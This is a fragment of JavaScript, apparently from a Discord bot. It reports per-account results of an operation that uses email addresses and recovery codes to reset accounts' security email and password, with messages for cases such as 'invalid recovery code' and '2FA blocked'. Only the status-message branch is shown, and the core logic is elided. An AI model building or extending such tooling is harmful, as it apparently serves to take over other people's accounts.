        ...
        try {
            ...
            const securePromises = accountLines.map(async (line, i) => {
                ...
                try {
                    ...
                    if (result === null) {
                        dmContent = { embeds: [{ title: `❌ Account Not Found`, description: `Email: \`${email}\`\nAccount does not exist or email is invalid.`, color: 0xff4444 }] };
                    } else if (result === 'invalid') {
                        dmContent = { embeds: [{ title: `❌ Invalid Recovery Code`, description: `Email: \`${email}\`\nThe recovery code provided was incorrect.`, color: 0xff4444 }] };
                    } else if (result === 'tfa') {
                        dmContent = { embeds: [{ title: `⚠️ 2FA Blocked`, description: `Email: \`${email}\`\n2FA is enabled. Use a different secure method.`, color: 0xffaa00 }] };
                    } else if (result === 'same') {
                        dmContent = { embeds: [{ title: `⚠️ Same Details`, description: `Email: \`${email}\`\nThe new security email/password matches the old one.`, color: 0xffaa00 }] };
                    } else if (result === 'unknown') {
                        dmContent = { embeds: [{ title: `❌ Unknown Error`, description: `Email: \`${email}\`\nAn unknown error occurred.`, color: 0xff4444 }] };
                    } else {
                        // Success
